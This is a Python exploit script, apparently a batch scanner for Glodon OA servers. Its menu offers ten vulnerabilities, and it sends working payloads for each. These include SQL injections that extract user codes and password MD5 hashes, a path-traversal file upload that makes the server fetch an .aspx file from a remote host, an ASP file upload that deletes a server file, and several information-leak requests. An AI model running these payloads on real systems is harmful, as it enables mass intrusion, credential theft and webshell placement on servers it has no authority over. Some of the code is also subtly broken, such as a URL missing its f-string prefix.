import sys
import requests
import argparse

def print_ascii_art():
    art = r"""
    ________  ___       ________  ________  ________  ________  ________
    |\   ____\|\  \     |\   ___ \|\   ____\|\   ____\|\   __  \|\   ___  \
    \ \  \___|\ \  \    \ \  \_|\ \ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \
     \ \  \  __\ \  \    \ \  \ \\ \ \_____  \ \  \    \ \   __  \ \  \\ \  \
      \ \  \|\  \ \  \____\ \  \_\\ \|____|\  \ \  \____\ \  \ \  \ \  \\ \  \
       \ \_______\ \_______\ \_______\____\_\  \ \_______\ \__\ \__\ \__\\ \__\
        \|_______|\|_______|\|_______|\_________\|_______|\|__|\|__|\|__| \|__|
                                     \|_________| by黄豆安全实验室
    """
    print(art)

def print_menu():
    print("=== 广联达OA综合漏洞检测工具  ===")
    print("请选择要检测的漏洞编号:")
    print("1. 广联达OA EmailAccountOrgUserService SQL注入漏洞")
    print("2. 广联达OA GetUserByEmployeeCode SQL注入漏洞")
    print("3. 广联达OA GetIMDictionarySQL注入漏洞")
    print("4. 广联达OA GetUserByUserCode SQL注入漏洞")
    print("5. 广联达OA GWGDWebService任意文件上传漏洞（需要修改脚本内容，见项目EXP.md）")
    print("6. 广联达OA GetAllData 信息泄露漏洞")
    print("7. 广联达OA GetChangeUsers 信息泄露漏洞")
    print("8. 广联达OA test.aspx 信息泄露漏洞")
    print("9. 广联达OA Service.asmx 信息泄露漏洞")
    print("10. 广联达OA UserFilesUpload任意文件上传漏洞")
    print("E. 退出")

def main():
    parser = argparse.ArgumentParser(description='漏洞检测工具')
    parser.add_argument('-u', '--url', type=str, help='单个URL进行检测')
    parser.add_argument('-t', '--targets', type=str, help='文件中批量URL进行检测')
    args = parser.parse_args()

    def add_http_if_missing(url):
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url

    if args.url:
        url = add_http_if_missing(args.url)
        print_menu()
        print_ascii_art()
        option = input("请输入你的选择: ")
        detect_vulnerability(option, url)
    elif args.targets:
        try:
            with open(args.targets, 'r') as file:
                urls = [add_http_if_missing(line.strip()) for line in file if line.strip()]
            print_menu()
            print_ascii_art()  
            option = input("请输入你的选择: ")
            for url in urls:
                print(f"正在检查目标: {url}")
                detect_vulnerability(option, url)
                print(f"{url} 的检测已完成。")
        except FileNotFoundError:
            print("指定的文件未找到")
    else:
        print("请提供单个URL或文件进行检测，如python main.py -t 1.txt")


def detect_vulnerability(option, url):
    if option == '1':
        print("正在检测广联达OA EmailAccountOrgUserService SQL注入漏洞...")
        
        def send_post_request_a(url, payload):
            # 修改请求的完整URL，我特么之前老忘写
            full_url = f"{url}/Mail/Services/EmailAccountOrgUserService.asmx"
            headers = {
                'Content-Type': 'text/xml; charset=utf-8',
                'SOAPAction': 'http://tempuri.org/GetUserInfosByEmail'
            }
            try:
                response = requests.post(full_url, headers=headers, data=payload)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        payload_a = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetUserInfosByEmail xmlns="http://tempuri.org/">
<email>') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('ShLa'='ShLa</email>
</GetUserInfosByEmail>
</soap:Body>
</soap:Envelope>"""

        response = send_post_request_a(url, payload_a)
        if response and response.status_code == 200 and 'qkkkq1qjpzq' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    elif option == '2':
        print("正在检测广联达OA GetUserByEmployeeCode SQL注入漏洞")
        
        def send_post_request_b(url, payload):
            full_url = f"{url}/Org/service/Service.asmx/GetUserByEmployeeCode"
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            try:
                response = requests.post(full_url, headers=headers, data=payload)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        payload_b = "employeeCode=1%27+AND+9748+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289748%3D9748%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29+AND+%27KENl%27%3D%27KENl&EncryptData=1"

        response = send_post_request_b(url, payload_b)
        if response and response.status_code == 500 and 'qbvjq1qxzzq' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    elif option == '3':
        print("正在检测广联达OA GetIMDictionary SQL 注入漏洞")
    
        def send_post_request_c(url, payload):
            full_url = f"{url}/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Cookie': 'ASP.NET_SessionId=iq02bz1sdodmt2z0ox1rjnqy; GTP_IdServer_LangID=2052',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            try:
                response = requests.post(full_url, headers=headers, data=payload)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        payload_c = {
            'key': "1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --",
            'employeeCode': "1' AND 9748 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (9748=9748) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(122)+CHAR(113))) AND ('KENl'='KENl",
            'EncryptData': '1'
        }

        response = send_post_request_c(url, payload_c)
        if response and response.status_code == 200 and 'admin' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    elif option == '4':
        print("正在检测广联达OA GetUserByUserCode SQL注入漏洞")

        def send_post_request_d(url, user_code):
            full_url = f"{url}/Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode={user_code}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Cookie': 'GTP_IdServer_LangID=2052; ASP.NET_SessionId=0qojkq03bxdprdshup5xd1pq',
                'Upgrade-Insecure-Requests': '1'
            }
            try:
                response = requests.get(full_url, headers=headers)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        user_code = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER),NULL,NULL--+"  # 注入的 userCode
        response = send_post_request_d(url, user_code)

        if response is not None and response.status_code == 200:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")


    elif option == '5':

        print("正在检测广联达OA GWGDWebService存在任意文件上传漏洞")
    
        full_url = f"{url}/GB/LK/ArchiveManagement/Js/GWGDWebService.asmx"
        headers = {
                "Content-Type": "text/xml; charset=utf-8",
                "User-Agent": "Mozilla/5.0"
        }
        # soap_request中<DownLoadURL>http://xxxxx:xxx/stc.aspx</DownLoadURL>需要修改，详见Exp.md
        soap_request = """
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
              <soapenv:Header/>
              <soapenv:Body>
                  <tem:GetGWGDData>
                  <tem:data>
                      <root>
                        <GWINFO>
                            <公文标题>1</公文标题>
                            <拟稿人>拟稿人</拟稿人>
                            <主送单位>主送单位</主送单位>
                            <主题词>主题词</主题词>
                            <印发份数>1</印发份数>
                            <签发日期>2022-12-07</签发日期>
                        </GWINFO>
                        <aa>
                            <FileName>./../../../../../../../applications/gtp-default/Web/Common/768a9b.aspx</FileName>
                            <DownLoadURL>http://xxxxx:xxx/stc.aspx</DownLoadURL>
                            
                        </aa>
                      </root>
                  </tem:data>
                </tem:GetGWGDData>
              </soapenv:Body>
            </soapenv:Envelope>"""
        try:
            response = requests.post(full_url, data=soap_request.encode('utf-8'), headers=headers)

            if response.status_code == 500:
                print(f"\033[92m漏洞存在: {url}，文件上传地址：{url}/Common/768a9b.aspx 请手动检测文件是否成功落地\033[0m")
            else:
                print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")
        except requests.RequestException as e:
            print(f"请求发生错误: {e}")

    elif option == '6':

        print("正在检测广联达OA GetAllData 信息泄露漏洞")
    
        def send_post_request_e(url, payload):
            full_url = f"{url}/WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx"
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Content-Type': 'text/xml;charset=UTF-8'
            }
            try:
                response = requests.post(full_url, headers=headers, data=payload)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        payload_e ="""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
            <soapenv:Header/>
            <soapenv:Body>
                <tem:GetAllData>
                    <!--type: string-->
                    <tem:Token>!@#$asdf$#@!</tem:Token>
                    <!--type: string-->
                    <tem:DataType>user</tem:DataType>
                </tem:GetAllData>
            </soapenv:Body>
        </soapenv:Envelope>"""

        response = send_post_request_e(url, payload_e)
        if response and response.status_code == 200 and 'admin' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    elif option == '7':
        print("正在检测广联达OA GetChangeUsers 信息泄露漏洞")
    
        def send_post_request_f(url):
            full_url = f"{url}/Org/service/Service.asmx/GetChangeUsers?strDate=2023-01-02"
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Content-Type': 'text/xml;charset=UTF-8'
            }
            try:
                response = requests.post(full_url, headers=headers)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        response = send_post_request_f(url)
        if response and response.status_code == 200 and 'NAME' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")
    
    elif option == '8':
        print("正在检测广联达OA test.aspx 信息泄露漏洞")

        def send_post_request_g(url):
            full_url = f"{url}/Services/Identification/Server/test.aspx"
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Content-Type': 'text/xml;charset=UTF-8'
            }
            try:
                response = requests.post(full_url, headers=headers)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        response = send_post_request_g(url)
        if response and response.status_code == 200 and '过期时间' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    elif option == '9':
        print("正在检测广联达OA Service.asmx 信息泄露漏洞")

        def send_post_request_h(url):
            full_url = f"{url}/Org/service/Service.asmx"
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Content-Type': 'text/xml;charset=UTF-8'
            }
            try:
                response = requests.post(full_url, headers=headers)
                return response
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
                return None

        response = send_post_request_h(url)  # 这里修正了函数调用
        if response and response.status_code == 200 and '服务说明' in response.text:
            print(f"\033[92m漏洞存在: {url}\033[0m")  # 绿色字体输出
        else:
            print(f"检测失败: {url}, 状态码: \033[31m{response.status_code}\033[0m")

    
    elif option == '10':
        print("正在检测广联达OA UserFilesUpload任意文件上传漏洞")
    
        full_url1 = f"{url}/Services/FileService/UserFiles/GetAuthorizeKey.ashx"
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "SL-CE-SUID": "97"
        }
        data1 = {
            "destDir": "./sysinfo/",
            "destFilename": "test.asp"
        }
        response1 = requests.post(full_url1, headers=headers1, data=data1)
        # 检查第一个请求的响应状态码和获取key值
        if response1.status_code == 200:
            key = response1.json().get("key")
            if key:
                url2 = "{url}/Services/FileService/UserFiles/UserFilesUpload.ashx"
                boundary = "----ehjqlfi2qaa6kb5c4xri"
                headers2 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
                    "Connection": "close",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "SL-CE-SUID": "97"
                }
                data2 = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="destDir"\r\n\r\n'
                    f"./sysinfo/\r\n"
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="destFilename"\r\n\r\n'
                    f"test.asp\r\n"
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="key"\r\n\r\n'
                    f"{key}\r\n"
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="successUrl"\r\n\r\n'
                    f"~\\sysinfo\r\n"
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="overWrite"\r\n\r\n'
                    f"true\r\n"
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="FileData"; filename="test.asp"\r\n'
                    f"Content-Type: image/png\r\n\r\n"
                    f"<% response.write(\"123456789\")\n"
                    f"set myfso=server.CreateObject(\"scripting.filesystemobject\") \n"
                    f"myfso.DeleteFile(Server.MapPath(\"rtiko.asp\"))%>\r\n"
                    f"--{boundary}--\r\n"
                )

                response2 = requests.post(url2, headers=headers2, data=data2)
                if response2.status_code == 302:
                    print("\033[92m漏洞存在，文件上传路径为{url}/UserFiles/sysinfo/test.asp\033[0m")
                else:
                    print("\033[31m文件上传请求失败，状态码:, response2.status_code\033[0m")
            else:
                print("\033[31m未能获取到key值\033[0m")
        else:
            print("第一个请求失败，状态码:", response1.status_code)
            
    elif option == 'E':
        print("退出程序。")
        sys.exit(0)

    else:
        print("无效选项，请重新选择。")

if __name__ == "__main__":
    main()



